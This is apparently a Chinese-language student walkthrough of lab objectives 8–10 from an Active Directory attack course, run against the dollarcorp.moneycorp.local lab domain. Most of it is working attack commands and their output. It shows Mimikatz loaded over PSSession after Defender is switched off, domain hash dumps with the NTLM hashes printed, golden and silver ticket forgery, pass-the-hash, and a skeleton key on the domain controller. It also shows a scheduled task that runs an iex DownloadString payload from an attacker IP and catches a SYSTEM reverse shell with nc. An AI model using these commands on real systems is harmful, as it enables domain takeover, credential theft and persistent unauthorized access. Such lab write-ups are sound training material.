账号srvadmin可以横向登录到计算机dcorp-mgmt.dollarcorp.moneycorp.local，我们把登录的session保存在$sess
```
$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软（效果跟bypass AMSI大同小异，不过因为我们是目标靶机上的管理员，因此可以直接关闭）
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

指定目标靶机的session，在目标靶机执行Mimikatz
```
Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
```

如果上面不能正常执行，直接enter psssession进去关掉实时防护，然后再执行Invoke-Mimikatz

收集到在NTML信息有：
```
DCORP-MGMT$ : 639c1adde3e0d1ba0d733c7d0d8f23ec
mgmtadmin : 95e2cd7ff77379e34c6e46265e75d754
svcadmin : b38ff50264b74508085d82c69794a4d8
```

由于svcadmin要DA管理员，因此我们已经提升到了DA权限


# Learning Objective 8:
Task
● Dump hashes on the domain controller of dollarcorp.moneycorp.local.
● Using the NTLM hash of krbtgt account, create a Golden ticket.
● Use the Golden ticket to (once again) get domain admin privileges from a machine.

## Dump hashes on the domain controller of dollarcorp.moneycorp.local.
开一个svcadmin的shell

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
```

bypass everything

引入mimikatz,dump all hash

```
[dcorp-dc]: PS C:\Users\svcadmin\Documents> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # lsadump::lsa /patch
Domain : dcorp / S-1-5-21-1874506631-3219952063-538504511

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : af0686cc0ca8f04df42210c9ac980760

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : ff46a9d8bd66c6efd77603da26796f35

RID  : 000001f7 (503)
User : DefaultAccount
LM   :
NTLM :

RID  : 00000455 (1109)
User : ciadmin
LM   :
NTLM : e08253add90dccf1a208523d02998c3d

RID  : 00000458 (1112)
User : sqladmin
LM   :
NTLM : 07e8be316e3da9a042a9cb681df19bf5

RID  : 00000459 (1113)
User : websvc
LM   :
NTLM : cc098f204c5887eaa8253e7c2749156f

RID  : 0000045b (1115)
User : srvadmin
LM   :
NTLM : a98e18228819e8eec3dfa33cb68b0728

RID  : 0000045d (1117)
User : appadmin
LM   :
NTLM : d549831a955fee51a43c83efb3928fa7

RID  : 00000461 (1121)
User : mgmtadmin
LM   :
NTLM : 95e2cd7ff77379e34c6e46265e75d754

RID  : 00000462 (1122)
User : svcadmin
LM   :
NTLM : b38ff50264b74508085d82c69794a4d8

RID  : 0000046b (1131)
User : studentadmin
LM   :
NTLM : d1254f303421d3cdbdc4c73a5bce0201

RID  : 00000470 (1136)
User : sql1admin
LM   :
NTLM : e999ae4bd06932620a1e78d2112138c6

<skip>
```



## Using the NTLM hash of krbtgt account, create a Golden ticket.
krbtgt hash:
```
krbtgt : ff46a9d8bd66c6efd77603da26796f35
```

制作一张Golden ticket（可以另外起一个student权限在shell）

```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```


验证金票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```

## Use the Golden ticket to (once again) get domain admin privileges from a machine.

因为金票下可以横向到任何一台计算机，所以可以去DC下再次dump出所有哈希,这里不再演示
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
dcorp-dc.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
```

# Learning Objective 9:
Task
● Try to get command execution on the domain controller by creating silver ticket for:
− HOST service
− WMI


DCORP-DC$的哈希信息
```
RID  : 000003e8 (1000)
User : DCORP-DC$
LM   :
NTLM : 126289c16302fb23b71ec09f0d3d5391
```
## HOST service

普通权限shell下执行命令
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```


验证银票：
```
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$
```


执行完上面命令，在当前shell会有一个Administrator的session

新建一个定时任务，反弹dc上的一个shell回来。需要注意Invoke-PowerShellTcp.ps1里最后一行要加上
```
Power -Reverse -IPAddress 172.16.100.66 -Port 443
```
表示调用自己


使用定时任务执行命令

## 制作定时任务：
```
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "User366" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.66/Invoke-PowerShellTcp.ps1''')'"
```

## 触发定时任务
```
schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "User366"
```

收到反弹shell
```
PS C:\ad> .\nc.exe -lnvp 443
listening on [any] 443 ...
connect to [172.16.100.66] from (UNKNOWN) [172.16.2.1] 51201

Windows PowerShell running as user DCORP-DC$ on DCORP-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> PS C:\Windows\system32> PS C:\Windows\system32>
PS C:\Windows\system32> whoami
nt authority\system
PS C:\Windows\system32> hostname
dcorp-dc
```
## WMI


RPCSS
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:126289c16302fb23b71ec09f0d3d5391 /user:Administrator /ptt"'
```

然后执行WMI 
```
PS C:\ad> Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local


SystemDirectory : C:\Windows\system32
Organization    :
BuildNumber     : 14393
RegisteredUser  : Windows User
SerialNumber    : 00377-80000-00000-AA805
Version         : 10.0.14393
```


# Learning Objective 10:
Task
● Use Domain Admin privileges obtained earlier to execute the Skeleton Key attack.

开一个DA shell

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:af0686cc0ca8f04df42210c9ac980760 /run:powershell.exe"'
```


### 方法1
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
### 方法2(推荐)
回到学生机器,创建一个DC的登录session
```
$sess = New-PSSession dcorp-dc.dollarcorp.moneycorp.local
```

把mimikatz加载到指定session
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

再次进入DC
```
 Enter-PSSession -Session $sess
```

执行mimikatz，制作万能钥匙
```
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
```

开一个学生shell使用下面命令以student368的身份进入主机
```Enter-PSSession –Computername dcorp-std368 –credential dcorp\student368```



